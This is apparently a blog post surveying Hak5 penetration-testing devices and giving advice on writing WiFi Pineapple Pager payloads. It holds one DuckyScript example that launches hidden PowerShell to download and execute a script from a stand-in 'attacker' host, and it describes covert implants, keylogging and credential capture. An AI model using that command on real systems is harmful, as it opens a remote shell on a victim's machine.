# 🍍 Hak5 Payloads & Tools — A Deep Dive from Someone Who Builds for Them

*March 7, 2026 — by bad-antics*

---

I spend a lot of time writing payloads for the WiFi Pineapple Pager. My [nullsec-pineapple-suite](https://github.com/bad-antics/nullsec-pineapple-suite) has 106 payloads across 14 categories — the largest third-party collection out there. So I figured it's worth writing about the Hak5 ecosystem, what makes it tick, and where I think things are heading.

---

## What is Hak5?

If you're reading this wiki you probably already know, but for the uninitiated: **Hak5** is a company that builds purpose-built hardware for penetration testing and security research. They've been around since 2005 and have essentially created the "plug and pwn" category of security tools.

Their devices are designed to be **simple to deploy, hard to detect**, and deeply scriptable via their own payload languages.

## The Current Hak5 Lineup

### 🍍 WiFi Pineapple (Mark VII & Pager)

The crown jewel. The Pineapple has been around for years and keeps evolving:

- **Mark VII** — The full-size version. Dual-band WiFi (2.4/5GHz), web-based management interface (Cloud C²), MicroSD slot, USB-C power. Runs OpenWrt under the hood. This is the go-to for WiFi auditing — evil twin attacks, WPA handshake capture, rogue AP detection, client enumeration, the works.

- **Pager** — The newer compact version. This is what I primarily write payloads for. It has a small OLED/e-ink display and physical buttons, making it a truly field-portable device. No laptop needed. You configure payloads, hit run, and it operates autonomously. The "Pager" form factor is brilliant for covert operations — it looks like a pager or a regular small device, not a hacking tool.

**What makes Pineapple payloads interesting:**

The Pager runs shell scripts (bash/ash) as payloads, with Hak5's proprietary helper functions for the display — `PROMPT`, `CONFIRMATION_DIALOG`, `SPINNER_START`, `NUMBER_PICKER`, etc. It's a constraint that forces you to think carefully about UX on a tiny screen while still doing complex WiFi operations under the hood.

Most payloads are doing one of these:
- **Recon** — Scanning the RF environment, mapping APs, tracking clients, fingerprinting devices
- **Attack** — Deauthentication, evil twin, captive portal credential harvesting, WPS brute force
- **Capture** — WPA handshakes, PMKID, credential sniffing, packet replay
- **Exfiltration** — Getting loot off the device to cloud storage, USB, DNS tunnels
- **Stealth** — Hiding the Pineapple's presence, MAC spoofing, traffic masking

The official Hak5 payload repo has ~155 payloads. My suite adds another 106 on top of that, focusing on areas they don't cover well — **temporal reconnaissance**, **forensics**, **device self-defense**, and **long-engagement operational tools**.

### 🐿️ USB Rubber Ducky

The original Hak5 product that most people know. It looks like a USB flash drive but it's actually a **keystroke injection tool** — when you plug it in, the target computer sees it as a keyboard, and it types pre-programmed keystrokes at superhuman speed.

**DuckyScript** is its payload language. It's evolved significantly:
- **DuckyScript 1.0** — Simple keystroke sequences (`STRING`, `DELAY`, `ENTER`)
- **DuckyScript 3.0** — Full programming language with variables, conditionals, loops, functions, and OS detection

Common payloads:
```
REM Reverse shell in 3 seconds
DELAY 500
GUI r
DELAY 300
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
ENTER
```

The Ducky is devastating in physical penetration tests. Drop one in a parking lot, leave one on a desk, hand one to someone — social engineering + keystroke injection = game over.

### 🦡 Bash Bunny

Think of it as the Rubber Ducky's bigger, smarter sibling. It can emulate:
- **Keyboard** (HID) — like the Ducky
- **Ethernet adapter** (RNDIS/ECM) — MITM network traffic
- **Mass storage** — exfiltrate files
- **Serial** — interact with embedded devices

The Bash Bunny runs a full Linux (Debian) internally, so your payloads are actual bash scripts. Multi-vector attacks become trivial:

1. Plug in → appears as Ethernet adapter
2. MITM the network connection, capture credentials
3. Switch to keyboard mode, inject commands
4. Switch to storage mode, exfiltrate files
5. All in under 10 seconds

The attack surface of "plug this USB device in" is terrifyingly large, and the Bash Bunny exploits all of it.

### 🐢 LAN Turtle

Network implant disguised as a USB Ethernet adapter. You plug it in between a computer and the network, and it becomes a persistent backdoor:

- **Reverse SSH tunnels** — phone-home access through firewalls
- **DNS poisoning** — redirect traffic without being on the wire
- **Packet capture** — log all traffic passing through
- **Responder** — capture NTLMv2 hashes from network authentication

It's the ultimate "leave behind" device. During a physical pentest, plug one into the back of a workstation, walk away, and you have persistent network access as long as no one finds it.

### 📡 Packet Squirrel

Inline network tap. Similar concept to the LAN Turtle but designed specifically for:
- **Packet capture** to local storage or cloud
- **VPN tunneling** — route traffic through your VPN transparently
- **Network payload injection**

The Mark II added USB-C and better performance. It's purpose-built for network forensics and covert traffic capture.

### 🔑 Key Croc

Keylogger + keystroke injection in one device. It sits between a keyboard and computer:
- **Logs every keystroke** the user types (including passwords)
- **Can inject keystrokes** (like a Rubber Ducky)
- **WiFi enabled** — exfiltrate captured keystrokes remotely
- **Word detection** — trigger payloads when specific words are typed

The word detection feature is clever: set it to trigger when someone types "password" or a specific URL, then inject keystrokes at that exact moment.

### ☁️ Cloud C²

Hak5's command and control platform. It's a web-based management interface that lets you:
- Control all your Hak5 devices remotely
- Deploy payloads over the internet
- View loot and results in real-time
- Manage multiple engagements

It's self-hosted (Docker container) and acts as the central nervous system for multi-device operations.

---

## Writing Payloads — What I've Learned

After building 106 payloads for the Pineapple Pager, here's what I've picked up:

### 1. The Display is Your Constraint

The Pager's screen is small. You can fit maybe 15-20 lines of text and ~25 characters wide. Every `PROMPT` needs to be carefully written — enough info to be useful, short enough to read at a glance in the field.

Bad:
```bash
PROMPT "The scan has been completed successfully. A total of 47 access points were discovered across 13 different channels with signal strengths ranging from -30dBm to -90dBm."
```

Good:
```bash
PROMPT "SCAN COMPLETE

APs found: 47
Channels: 13
Best signal: -30dBm

Press OK for details."
```

### 2. Always Save Loot

Every payload should save its output to `/mmc/` (SD card). The Pager's internal storage is tiny. Always create a loot directory, always timestamp your files, always write a report. Users will want to review results later on a real computer.

### 3. Fail Gracefully

Field conditions are unpredictable. Your WiFi adapter might not support monitor mode. `aircrack-ng` might not be installed. The SD card might be full. Check for every dependency at the start and show a clear error message if something is missing.

### 4. Channel Hopping Matters

If you're doing any kind of recon, you need to hop channels. Sitting on channel 6 means you miss everything on channels 1 and 11. But hopping too fast means you miss packets. I've found **0.2-0.3 seconds per channel** is the sweet spot for the Pager's hardware — enough dwell time to catch most traffic without spending too long on empty channels.

### 5. Think About the Operator

The person using your payload might be standing in a server room, crouched under a desk, or sitting in a car in a parking lot. They can't spend 30 seconds reading each screen. Make your payloads **opinionated** — pick smart defaults, let them override if they want, but don't make them configure 10 settings before starting.

---

## Payloads Nobody Else is Building

The Hak5 community tends to focus on the obvious stuff — deauth, evil twin, handshake capture. Those are important, but there's a huge gap in several areas:

### Temporal Analysis

Everyone captures a snapshot of the WiFi environment. Nobody tracks **how it changes over time**. My [WiFiTimeline](https://github.com/bad-antics/nullsec-pineapple-suite) payload builds a time-series of AP appearances, disappearances, SSID changes, and channel migrations. Run it for 4 hours and you'll see patterns — when employees arrive and leave, when IoT devices cycle, when APs reboot overnight.

### Device Self-Defense

Everyone builds tools to attack other devices with the Pineapple. Nobody protects the Pineapple itself. My [RogueUSBGuard](https://github.com/bad-antics/nullsec-pineapple-suite) payload monitors the Pineapple's own USB ports — if someone plugs a BadUSB or implant into your device during an engagement, you get an immediate alert with threat classification.

### Attack Forensics

If you detect a deauth attack in the field, wouldn't you want to know what tool is being used? My [DeauthForensics](https://github.com/bad-antics/nullsec-pineapple-suite) payload captures deauth frames and **fingerprints the attacker's tool** based on reason codes, targeting patterns, and frame timing. It can distinguish between aireplay-ng, mdk3/4, bully, and custom scripts.

### Operational Health

The Pineapple is an embedded device running on limited hardware. During a 12-hour engagement, it might overheat, run out of storage, or have an interface crash. My [HeartbeatMonitor](https://github.com/bad-antics/nullsec-pineapple-suite) payload tracks CPU temp, memory, storage, and interface status continuously — with configurable alerts so you know the moment something goes wrong instead of finding out hours later that your captures stopped.

---

## The Hak5 Payload Ecosystem — Honest Assessment

**Strengths:**
- The community payload repos are well-organized and accessible
- DuckyScript 3.0 is genuinely good — a real scripting language with OS detection
- The Pager payload UI framework (PROMPT, SPINNER, etc.) is clean and well-designed
- Cloud C² ties everything together for professional engagements

**Weaknesses:**
- Most community payloads are low-effort (10-20 line scripts that wrap a single tool)
- Very few payloads do **chained operations** (scan → identify → exploit → exfil)
- Almost zero focus on **defensive/blue-team** use cases
- No payload handles long-running operations well (no progress tracking, no health monitoring)
- The 5GHz support across community payloads is weak — most only scan 2.4GHz

**Where I think it's heading:**
- AI-assisted payload generation (describe what you want, get a payload)
- Better integration between devices (Ducky → Bash Bunny → Pineapple → LAN Turtle as a coordinated attack chain)
- More focus on reporting and compliance (pentesters need deliverables, not just loot files)
- The Pager form factor will keep shrinking — eventually these tools will be indistinguishable from everyday objects

---

## Getting Started with Hak5 Development

If you want to write payloads:

1. **Pick one device** and learn it deeply. Don't try to write for everything at once.
2. **Read the official payloads** — not for the code, but for the patterns. How do they handle errors? How do they structure output?
3. **Solve a real problem you've had** during an engagement. The best payloads come from "I wish this existed."
4. **Test on real hardware**. Emulators and VMs will miss timing issues, hardware quirks, and display limitations.
5. **Share your work**. The community is small and every good payload gets noticed.

If you want to use my suite on your Pineapple Pager:

```bash
git clone https://github.com/bad-antics/nullsec-pineapple-suite
cd nullsec-pineapple-suite
./install.sh
```

106 payloads, 14 categories, one command.

---

## Links

- [Hak5 Official](https://hak5.org)
- [Hak5 Payload Repos](https://github.com/hak5)
- [NullSec Pineapple Suite (106 payloads)](https://github.com/bad-antics/nullsec-pineapple-suite)
- [WiFi Pineapple Docs](https://docs.hak5.org/wifi-pineapple)
- [DuckyScript Reference](https://docs.hak5.org/hak5-usb-rubber-ducky)

---

*This post is part of the [NullSec Wiki](https://github.com/bad-antics/nullsec-wiki). For more tools, see [bad-antics on GitHub](https://github.com/bad-antics).*
